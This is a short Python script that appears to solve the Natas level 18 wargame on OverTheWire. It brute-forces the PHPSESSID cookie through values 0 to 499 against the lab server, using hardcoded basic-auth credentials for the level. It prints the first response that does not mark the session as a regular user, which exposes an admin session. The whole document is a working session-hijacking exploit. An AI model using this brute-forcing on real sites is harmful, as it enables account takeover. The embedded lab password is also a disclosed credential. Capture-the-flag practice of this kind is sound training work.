import requests
from requests.auth import HTTPBasicAuth 


Auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for i in range(500):
    header = {"Cookie": "PHPSESSID={0}".format(i)} 
    r = requests.post('http://natas18.natas.labs.overthewire.org/', auth=Auth, headers=header)

    if 'regular user' in r.text:
        print ('Fail')
    else:
        print(r.text)
        break